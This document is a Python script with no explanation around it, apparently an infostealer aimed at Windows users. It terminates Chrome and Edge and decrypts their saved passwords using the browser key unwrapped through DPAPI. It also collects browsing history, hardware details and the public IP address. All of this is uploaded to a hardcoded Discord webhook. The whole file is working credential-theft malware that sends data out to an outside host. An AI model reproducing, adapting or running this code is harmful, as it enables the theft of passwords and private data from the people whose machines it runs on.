import os
import sqlite3
import win32crypt
import time
import psutil
import json
import requests
from Crypto.Cipher import AES
from base64 import b64decode
import platform
import socket
import subprocess
import sys
import shutil
from requests.structures import CaseInsensitiveDict
DEBUG = False
WEBHOOK_URL = "https://discord.com/api/webhooks/1325476239598686289/gfA-E9WkNH7eGmCDZ2JdYMwuYSXelI-716Sa-4mJJLK8xBTKSvtXox2JHUu00bxh6t6u"
def debug_print(message):
    if DEBUG:
        print(message)
def install_modules():
    debug_print("Installing required modules...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "requests", "pycryptodome", "pywin32"])
    except subprocess.CalledProcessError as e:
        debug_print(f"Error installing modules: {e}")
def close_browser(browser_name):
    debug_print(f"Closing {browser_name} browser...")
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            if browser_name.lower() in proc.info['name'].lower():
                proc.terminate()
                debug_print(f"Successfully closed {proc.info['name']} (PID: {proc.info['pid']})")
        except psutil.NoSuchProcess:
            continue
        except psutil.AccessDenied:
            debug_print(f"Access denied for {browser_name} process (PID: {proc.info['pid']})")
def send_webhook_update(content, webhook_url, embeds=None, message_id=None):
    headers = {
        "Content-Type": "application/json",
    }
    data = {"content": content}
    if embeds:
        data["embeds"] = embeds
    if message_id:
        data["message_id"] = message_id
    response = requests.post(webhook_url, json=data, headers=headers)
    debug_print(f"Webhook update sent: {content}")
    return response
def create_hardware_embed(hardware_info, ip_address):
    embed = {
        "title": "Hardware Information",
        "color": 65280,
        "fields": [
            {"name": "System", "value": hardware_info['system']},
            {"name": "CPU", "value": hardware_info['cpu']},
            {"name": "RAM", "value": hardware_info['ram']},
            {"name": "Disk", "value": hardware_info['disk']},
            {"name": "IP Address", "value": ip_address}
        ],
        "footer": {"text": "Hardware Info"}
    }
    return embed
def gather_hardware_info():
    username = os.getlogin()
    system_info = platform.uname()
    cpu_info = psutil.cpu_freq()
    memory_info = psutil.virtual_memory()
    disk_info = psutil.disk_usage('/')
    hardware_info = {
        "system": f"{system_info.system} {system_info.release} ({system_info.machine})",
        "cpu": f"{cpu_info.current} MHz",
        "ram": f"{memory_info.total / (1024 ** 3):.2f} GB / {memory_info.available / (1024 ** 3):.2f} GB available",
        "disk": f"{disk_info.total / (1024 ** 3):.2f} GB total / {disk_info.free / (1024 ** 3):.2f} GB available"
    }
    return hardware_info
def fetch_ip_address():
    try:
        ip = requests.get('https://api.ipify.org').text
        debug_print(f"IP Address: {ip}")
        return ip
    except requests.RequestException as e:
        debug_print(f"Failed to fetch IP address: {e}")
        return "IP not available"
def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            cipher_text = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(cipher_text, tag)
            return decrypted.decode(errors='ignore')
        else:
            return "Unsupported encryption format"
    except Exception as e:
        return f"Decryption Failed: {e}"
def fetch_browser_data(browser_name, profile_path):
    debug_print(f"Fetching {browser_name} data...")
    local_state_path = os.path.join(profile_path, "User Data", "Local State")
    login_data_path = os.path.join(profile_path, "User Data", "Default", "Login Data")
    history_path = os.path.join(profile_path, "User Data", "Default", "History")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
        encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    passwords = []
    try:
        conn = sqlite3.connect(login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, key)
            passwords.append(f"URL: {url}\nUsername: {username}\nDecrypted Password: {decrypted_password}\n\n")
        conn.close()
    except sqlite3.OperationalError:
        debug_print(f"Failed to open database: {login_data_path}. Database is likely locked.")
        passwords.append(f"Could not fetch passwords from {browser_name} as the database is locked.")
    history = []
    try:
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        for row in cursor.fetchall():
            history.append(f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit Time: {row[2]}\n\n")
        conn.close()
    except sqlite3.OperationalError:
        debug_print(f"Failed to open database: {history_path}. Database is likely locked.")
        history.append(f"Could not fetch history from {browser_name}.")
    return passwords, history
def save_to_temp_file(data, file_name):
    temp_dir = os.getenv('TEMP')
    file_path = os.path.join(temp_dir, file_name)
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(data)
    debug_print(f"Data saved to {file_path}")
    return file_path
def send_file_to_discord(file_path, webhook_url):
    with open(file_path, "rb") as f:
        response = requests.post(
            webhook_url,
            files={"file": f},
            data={"content": "Here is the browser data!"}
        )
        debug_print(f"File sent to Discord with status code {response.status_code}")
    return response
if __name__ == "__main__":
    debug_print("Debugging mode enabled. Running script with visible console.")
    close_browser("chrome")
    close_browser("edge")
    install_modules()
    chrome_profile_path = os.path.join(os.getenv('USERPROFILE'), "AppData", "Local", "Google", "Chrome")
    edge_profile_path = os.path.join(os.getenv('USERPROFILE'), "AppData", "Local", "Microsoft", "Edge")
    chrome_passwords, chrome_history = fetch_browser_data("Chrome", chrome_profile_path)
    send_webhook_update("Finished fetching Chrome data...", WEBHOOK_URL)
    edge_passwords, edge_history = fetch_browser_data("Edge", edge_profile_path)
    send_webhook_update("Finished fetching Edge data...", WEBHOOK_URL)
    all_passwords = chrome_passwords + edge_passwords
    all_history = chrome_history + edge_history
    print(edge_passwords + edge_history)
    login_file = save_to_temp_file("".join(all_passwords), "login_data.txt")
    send_file_to_discord(login_file, WEBHOOK_URL)
    send_webhook_update("Login data sent to Discord!", WEBHOOK_URL)
    history_file = save_to_temp_file("".join(all_history), "history_data.txt")
    send_file_to_discord(history_file, WEBHOOK_URL)
    send_webhook_update("History data sent to Discord!", WEBHOOK_URL)
    hardware_info = gather_hardware_info()
    ip_address = fetch_ip_address()
    embed = create_hardware_embed(hardware_info, ip_address)
    send_webhook_update("Hardware Info found!", WEBHOOK_URL, embeds=[embed])
    send_webhook_update("All data sent to Discord.", WEBHOOK_URL)
